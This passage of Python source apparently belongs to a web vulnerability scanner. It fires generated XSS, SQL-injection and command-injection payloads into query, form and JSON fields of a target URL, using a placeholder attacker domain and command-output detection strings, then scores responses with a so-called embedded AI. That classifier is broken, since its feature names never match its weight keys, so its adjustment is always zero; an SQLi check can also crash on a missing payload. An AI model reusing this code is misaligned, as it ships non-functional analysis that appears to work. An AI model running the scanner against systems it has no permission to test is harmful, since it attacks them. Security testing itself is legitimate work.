        Returns:
            List of detected vulnerabilities
        """
        results = []
        
        # Skip if we're in passive mode
        if self.config.passive_analysis_only:
            logger.info(f"Skipping active testing of {url} (passive mode only)")
            return []
        
        # If no specific vulnerability types are specified, test all types
        if not vulnerability_types:
            vulnerability_types = list(self.vulnerability_patterns.keys())
        
        # Set default parameters if none provided
        parameters = parameters or {}
        
        # If there are query parameters in the URL, extract them
        if '?' in url and not parameters:
            query = urlparse(url).query
            for param_pair in query.split('&'):
                if '=' in param_pair:
                    param, value = param_pair.split('=', 1)
                    parameters[param] = value
        
        # If we have parameters, test each one
        if parameters:
            for param_name, param_value in parameters.items():
                param_results = await self._test_parameter(
                    url, method, param_name, param_value, vulnerability_types,
                    data, json_data, cookies, headers
                )
                results.extend(param_results)
        
        # If we have form data, test each field
        elif data:
            for field_name, field_value in data.items():
                if isinstance(field_value, str):  # Only test string fields
                    field_results = await self._test_parameter(
                        url, method, field_name, field_value, vulnerability_types,
                        {**data, field_name: None},  # Replace with None to indicate it should be filled in
                        json_data, cookies, headers
                    )
                    results.extend(field_results)
        
        # If we have JSON data, test each field
        elif json_data:
            flat_json = self._flatten_json(json_data)
            for path, value in flat_json.items():
                if isinstance(value, str):  # Only test string fields
                    field_results = await self._test_json_field(
                        url, method, path, value, vulnerability_types,
                        data, json_data, cookies, headers
                    )
                    results.extend(field_results)
        
        # If no parameters/data, test the base URL
        else:
            # This is a very basic test, just to see if the endpoint responds to malicious requests
            for vuln_type in vulnerability_types:
                payloads = await self.generate_payloads(vuln_type)
                
                for payload in payloads[:min(2, len(payloads))]:  # Test just a few payloads
                    test_url = url
                    if '?' not in url:
                        test_url = f"{url}?test={payload}"
                    else:
                        test_url = f"{url}&test={payload}"
                    
                    response, response_data, error = await self.scanner.fetch(
                        url=test_url,
                        method=method,
                        headers=headers,
                        cookies=cookies
                    )
                    
                    if not error and response:
                        vuln_results = await self.analyze_response(test_url, response, response_data, payload, vuln_type)
                        results.extend(vuln_results)
        
        return results
    
    async def _test_parameter(self, url: str, method: str, 
                            param_name: str, param_value: str, 
                            vulnerability_types: List[str],
                            data: Dict[str, Any] = None,
                            json_data: Dict[str, Any] = None,
                            cookies: Dict[str, str] = None,
                            headers: Dict[str, str] = None) -> List[VulnerabilityResult]:
        """
        Test a specific parameter for vulnerabilities.
        
        Args:
            url: URL to test
            method: HTTP method to use
            param_name: Name of the parameter to test
            param_value: Original value of the parameter
            vulnerability_types: Types of vulnerabilities to test
            data: Form data to include
            json_data: JSON data to include
            cookies: Cookies to include
            headers: Headers to include
            
        Returns:
            List of detected vulnerabilities
        """
        results = []
        
        for vuln_type in vulnerability_types:
            # Get context-aware payloads
            context = {"original_value": param_value}
            
            # Add parameter-specific context
            if param_name.lower() in ['url', 'uri', 'href', 'src', 'action', 'location', 'redirect', 'redirecturl']:
                context["is_url_param"] = True
                context["attacker_domain"] = "evil.example.com"
            
            if param_name.lower() in ['cmd', 'command', 'exec', 'run', 'system', 'os']:
                context["is_command_param"] = True
                context["os"] = "linux"  # Default assumption
            
            payloads = await self.generate_payloads(vuln_type, context)
            
            # Limit the number of attempts per vulnerability type
            max_attempts = self.config.max_attempts_per_vuln_type
            payloads = payloads[:max_attempts]
            
            for payload in payloads:
                # Create the test request
                test_url = url
                test_data = data.copy() if data else None
                test_json = json_data.copy() if json_data else None
                
                # Determine how to include the payload
                if method in ['GET', 'DELETE'] or '?' in url:
                    # For GET/DELETE or if the URL already has query parameters, modify the URL
                    if '?' in url:
                        # Replace the parameter in the URL
                        parsed_url = urlparse(url)
                        query_dict = parse_qs(parsed_url.query)
                        
                        # Check if the parameter exists in the URL
                        if param_name in query_dict:
                            query_dict[param_name] = [payload]
                            new_query = '&'.join(f"{k}={v[0]}" for k, v in query_dict.items())
                            test_url = url.split('?')[0] + '?' + new_query
                        else:
                            # Parameter doesn't exist in URL, add it
                            test_url = f"{url}&{param_name}={payload}"
                    else:
                        # URL doesn't have query parameters, add the payload as a new parameter
                        test_url = f"{url}?{param_name}={payload}"
                
                elif method in ['POST', 'PUT', 'PATCH']:
                    # For POST/PUT/PATCH, modify the data
                    if data is not None:
                        # Check if we should replace a field in the form data
                        if param_name in data:
                            test_data = {**data}
                            test_data[param_name] = payload
                    
                    elif json_data is not None:
                        # Check if we should replace a field in the JSON data
                        if param_name in json_data:
                            test_json = {**json_data}
                            test_json[param_name] = payload
                    
                    else:
                        # No data provided, set the parameter as form data
                        test_data = {param_name: payload}
                
                # Make the request
                response, response_data, error = await self.scanner.fetch(
                    url=test_url,
                    method=method,
                    data=test_data,
                    json_data=test_json,
                    headers=headers,
                    cookies=cookies
                )
                
                # Check for vulnerabilities
                if not error and response:
                    vuln_results = await self.analyze_response(test_url, response, response_data, payload, vuln_type)
                    results.extend(vuln_results)
                
                    # If we found a vulnerability, update our successful payloads
                    if vuln_results:
                        if vuln_type not in self.successful_payloads:
                            self.successful_payloads[vuln_type] = []
                        if payload not in self.successful_payloads[vuln_type]:
                            self.successful_payloads[vuln_type].append(payload)
        
        return results
    
    async def _test_json_field(self, url: str, method: str, 
                             path: str, value: str, 
                             vulnerability_types: List[str],
                             data: Dict[str, Any] = None,
                             json_data: Dict[str, Any] = None,
                             cookies: Dict[str, str] = None,
                             headers: Dict[str, str] = None) -> List[VulnerabilityResult]:
        """
        Test a specific field in a JSON object for vulnerabilities.
        
        Args:
            url: URL to test
            method: HTTP method to use
            path: Path to the field (e.g., "user.address.city")
            value: Original value of the field
            vulnerability_types: Types of vulnerabilities to test
            data: Form data to include
            json_data: JSON data to include
            cookies: Cookies to include
            headers: Headers to include
            
        Returns:
            List of detected vulnerabilities
        """
        results = []
        
        for vuln_type in vulnerability_types:
            # Get context-aware payloads
            path_parts = path.split('.')
            field_name = path_parts[-1]
            
            context = {"original_value": value}
            
            # Add field-specific context
            if field_name.lower() in ['url', 'uri', 'href', 'src', 'action', 'location', 'redirect', 'redirecturl']:
                context["is_url_param"] = True
                context["attacker_domain"] = "evil.example.com"
            
            if field_name.lower() in ['cmd', 'command', 'exec', 'run', 'system', 'os']:
                context["is_command_param"] = True
                context["os"] = "linux"  # Default assumption
            
            payloads = await self.generate_payloads(vuln_type, context)
            
            # Limit the number of attempts per vulnerability type
            max_attempts = self.config.max_attempts_per_vuln_type
            payloads = payloads[:max_attempts]
            
            for payload in payloads:
                # Create a copy of the JSON data
                test_json = json_data.copy() if json_data else {}
                
                # Update the field at the given path
                current = test_json
                for i, part in enumerate(path_parts):
                    if i == len(path_parts) - 1:
                        # Last part, set the value
                        current[part] = payload
                    else:
                        # Navigate the path
                        if part not in current or not isinstance(current[part], dict):
                            current[part] = {}
                        current = current[part]
                
                # Make the request
                response, response_data, error = await self.scanner.fetch(
                    url=url,
                    method=method,
                    data=data,
                    json_data=test_json,
                    headers=headers,
                    cookies=cookies
                )
                
                # Check for vulnerabilities
                if not error and response:
                    vuln_results = await self.analyze_response(url, response, response_data, payload, vuln_type)
                    results.extend(vuln_results)
                
                    # If we found a vulnerability, update our successful payloads
                    if vuln_results:
                        if vuln_type not in self.successful_payloads:
                            self.successful_payloads[vuln_type] = []
                        if payload not in self.successful_payloads[vuln_type]:
                            self.successful_payloads[vuln_type].append(payload)
        
        return results
    
    def _flatten_json(self, json_obj: Dict[str, Any], prefix: str = '') -> Dict[str, Any]:
        """
        Flatten a nested JSON object into a dictionary with path keys.
        
        Args:
            json_obj: JSON object to flatten
            prefix: Prefix for nested keys
            
        Returns:
            Flattened dictionary
        """
        flattened = {}
        
        for key, value in json_obj.items():
            new_key = f"{prefix}.{key}" if prefix else key
            
            if isinstance(value, dict):
                flattened.update(self._flatten_json(value, new_key))
            else:
                flattened[new_key] = value
        
        return flattened


class EmbeddedAI:
    """
    Embedded AI model for vulnerability analysis and payload generation.
    This is a simplified implementation using basic techniques.
    """
    
    def __init__(self):
        """Initialize the embedded AI."""
        self.initialized = False
        self.feature_extractors = {}
        self.classifiers = {}
        self.embeddings = {}
    
    async def initialize(self):
        """Initialize the AI models."""
        # In a real implementation, this would load models from disk or download them
        # Here we just set up some basic functionality
        self.initialized = True
        
        # Set up feature extractors (simplified)
        self.feature_extractors = {
            "xss": self._extract_xss_features,
            "sqli": self._extract_sqli_features,
            "rce": self._extract_rce_features
        }
        
        # Set up "classifiers" (very simplified)
        self.classifiers = {
            "xss": {
                "weight_script_tags": 0.8,
                "weight_js_functions": 0.6,
                "weight_attribute_events": 0.7,
            },
            "sqli": {
                "weight_sql_errors": 0.9,
                "weight_multiple_rows": 0.7,
                "weight_syntax_tokens": 0.6,
            },
            "rce": {
                "weight_command_output": 0.9,
                "weight_system_info": 0.8,
                "weight_delay_correlation": 0.7,
            }
        }
    
    def is_initialized(self) -> bool:
        """Check if the AI is initialized."""
        return self.initialized
    
    async def analyze_vulnerabilities(self, results: List[VulnerabilityResult], 
                                      url: str, response_data: str, 
                                      payload: str = None) -> List[VulnerabilityResult]:
        """
        Use embedded AI to analyze and validate vulnerability results.
        
        Args:
            results: List of detected vulnerabilities
            url: URL that was tested
            response_data: Response content
            payload: Optional payload that was used
            
        Returns:
            Validated list of vulnerabilities
        """
        if not self.initialized or not results or not isinstance(response_data, str):
            return results
        
        validated_results = []
        
        for result in results:
            # Extract features for this vulnerability type
            features = self._extract_features(result.vulnerability_type, result, response_data, payload)
            
            # Apply the classifier
            if features:
                confidence_adjustment = self._classify_vulnerability(result.vulnerability_type, features)
                
                # Adjust the confidence score
                new_confidence = min(max(result.confidence + confidence_adjustment, 0.0), 1.0)
                result.confidence = new_confidence
                
                # Only include if confidence is still above threshold
                if new_confidence >= 0.5:  # Using a fixed threshold for simplicity
                    validated_results.append(result)
            else:
                # If we couldn't extract features, keep the original result
                validated_results.append(result)
        
        return validated_results
    
    def _extract_features(self, vulnerability_type: str, result: VulnerabilityResult, 
                         response_data: str, payload: str = None) -> Dict[str, float]:
        """
        Extract features for a specific vulnerability type.
        
        Args:
            vulnerability_type: Type of vulnerability
            result: Vulnerability result
            response_data: Response content
            payload: Optional payload that was used
            
        Returns:
            Dictionary of features
        """
        if vulnerability_type in self.feature_extractors:
            extractor = self.feature_extractors[vulnerability_type]
            return extractor(result, response_data, payload)
        
        return {}
    
    def _classify_vulnerability(self, vulnerability_type: str, features: Dict[str, float]) -> float:
        """
        Classify a vulnerability based on its features.
        
        Args:
            vulnerability_type: Type of vulnerability
            features: Extracted features
            
        Returns:
            Confidence adjustment (-1.0 to 1.0)
        """
        if vulnerability_type not in self.classifiers:
            return 0.0
        
        # Get the weights for this vulnerability type
        weights = self.classifiers[vulnerability_type]
        
        # Calculate a weighted score
        score = 0.0
        total_weight = 0.0
        
        for feature_name, feature_value in features.items():
            if feature_name in weights:
                weight = weights[feature_name]
                score += feature_value * weight
                total_weight += weight
        
        if total_weight == 0:
            return 0.0
        
        # Normalize the score to [-1, 1]
        normalized_score = (score / total_weight) * 2 - 1
        
        # Limit the adjustment to a reasonable range
        return max(min(normalized_score, 0.5), -0.5)
    
    def _extract_xss_features(self, result: VulnerabilityResult, 
                             response_data: str, payload: str = None) -> Dict[str, float]:
        """Extract features for XSS vulnerabilities."""
        features = {}
        
        if not payload or not response_data:
            return features
        
        # Check if script tags in payload appear in response
        if "<script" in payload:
            script_count = response_data.count("<script")
            features["has_script_tags"] = min(script_count / 3, 1.0)
        
        # Check for JS events in the response
        js_events = ["onload", "onerror", "onclick", "onmouseover", "onfocus"]
        if any(event in payload for event in js_events):
            event_matches = sum(response_data.count(event) for event in js_events if event in payload)
            features["has_js_events"] = min(event_matches / 3, 1.0)
        
        # Check for payload reflection
        if payload in response_data:
            features["payload_reflected"] = 1.0
        elif html.escape(payload) in response_data:
            features["payload_encoded"] = 0.5
        else:
            features["payload_not_found"] = 1.0
        
        # Check context (tag, attribute, JS) - simplified
        if payload in response_data:
            # Find the position of the payload
            pos = response_data.find(payload)
            context_before = response_data[max(0, pos - 100):pos]
            context_after = response_data[pos:min(len(response_data), pos + 100)]
            
            # Check if inside script tag
            if "<script" in context_before and "</script>" in context_after:
                features["in_script_context"] = 1.0
            
            # Check if inside attribute
            if re.search(r'<[^>]+[a-zA-Z]+=([\'"])[^\'"]*$', context_before) and re.match(r'[^\'"]*\1', context_after):
                features["in_attribute_context"] = 1.0
        
        return features
    
    def _extract_sqli_features(self, result: VulnerabilityResult, 
                              response_data: str, payload: str = None) -> Dict[str, float]:
        """Extract features for SQL injection vulnerabilities."""
        features = {}
        
        if not response_data:
            return features
        
        # Check for SQL errors in the response
        sql_errors = [
            "SQL syntax", "MySQL", "MariaDB", "ORA-", "Oracle", "SQL Server",
            "PostgreSQL", "SQLite", "syntax error", "unterminated", "unclosed"
        ]
        
        error_count = sum(response_data.count(error) for error in sql_errors)
        features["has_sql_errors"] = min(error_count / 3, 1.0)
        
        # Check for successful SQLi indicators
        if "order by" in payload.lower() or "group by" in payload.lower():
            # Look for signs of data manipulation
            # Simplified: check if there are multiple rows/tables in the response
            table_indicators = ["<tr", "<td", "<th", "<table", "row", "column"]
            table_count = sum(response_data.count(indicator) for indicator in table_indicators)
            features["has_table_structure"] = min(table_count / 20, 1.0)
        
        # Check for boolean-based
        if payload and ("1=1" in payload or "1=2" in payload):
            # For boolean-based SQLi, one condition should show content and the other might not
            # Simplified: just check response length as an indicator
            features["response_size"] = min(len(response_data) / 10000, 1.0)
        
        # Check for typical tokens in the response that might indicate SQL content
        sql_tokens = ["SELECT", "FROM", "WHERE", "INSERT", "UPDATE", "DELETE", "DROP", "CREATE", "ALTER"]
        token_count = sum(response_data.upper().count(token) for token in sql_tokens)
        features["has_sql_tokens"] = min(token_count / 10, 1.0)
        
        return features
    
    def _extract_rce_features(self, result: VulnerabilityResult, 
                             response_data: str, payload: str = None) -> Dict[str, float]:
        """Extract features for RCE vulnerabilities."""
        features = {}
        
        if not response_data or not payload:
            return features
        
        # Check for command output in the response
        command_indicators = {
            "id": ["uid=", "gid=", "groups="],
            "ls": ["total ", "drwx", "-rwx", "-r--"],
            "dir": ["Directory of", "Volume Serial Number", "File(s)", "Dir(s)"],
            "whoami": ["root", "admin", "www-data"],
            "ping": ["PING", "bytes of data", "time=", "ttl=", "packets transmitted"],
            "cat": ["root:x:", "www-data", "bash"],
            "type": ["this is not recognized", "internal or external command"],
        }
        
        # Try to determine which command was injected
        injected_command = None
        for cmd in command_indicators:
            if cmd in payload:
                injected_command = cmd
                break
        
        if injected_command:
            # Check for indicators of this command in the response
            indicators = command_indicators[injected_command]
            indicator_count = sum(response_data.count(indicator) for indicator in indicators)
            features["has_command_output"] = min(indicator_count / len(indicators), 1.0)
        
        # Check for system information leakage
        system_info = ["Linux", "Windows", "Ubuntu", "Debian", "CentOS", 
                      "kernel", "Darwin", "Unix", "BSD"]
        system_count = sum(response_data.count(info) for info in system_info)
        features["has_system_info"] = min(system_count / 5, 1.0)
        
        # Check for delay-based injection
        if "sleep" in payload or "ping" in payload or "timeout" in payload:
            # In a real implementation, we would check the response time
            # Here we'll just give a fixed score
            features["delay_correlation"] = 0.7
        
        return features


# Example usage
async def test_vulnerability_detector(url: str):
    """Test the vulnerability detector on a given URL."""
    from async_scanner import AsyncScannerEngine, ScanConfig, ScanTarget
    
    # Create scan configuration
    target = ScanTarget(url=url)
    config = ScanConfig(
        scan_id="test",
        target=target,
        max_depth=1,
        max_pages=10,
        concurrency=5
    )
    
    # Create scanner engine
    scanner = AsyncScannerEngine(config)
    
    # Create and initialize vulnerability detector
    detector = AIVulnerabilityDetector(scanner)
    await detector.initialize()
    
    # Test the endpoint
    results = await detector.test_endpoint(url)
    
    print(f"Found {len(results)} potential vulnerabilities at {url}:")
    for result in results:
        print(f"- {result.vulnerability_type} ({result.severity}, {result.confidence:.2f}): {result.description}")
        print(f"  Location: {result.location}")
        print(f"  Evidence: {result.evidence}")
        print()
    
    return results

if __name__ == "__main__":
    import sys
    import asyncio
    
    if len(sys.argv) < 2:
        print("Usage: python vulnerability_detector.py <target_url>")
        sys.exit(1)
    
    target_url = sys.argv[1]
    
    loop = asyncio.get_event_loop()
    loop.run_until_complete(test_vulnerability_detector(target_url))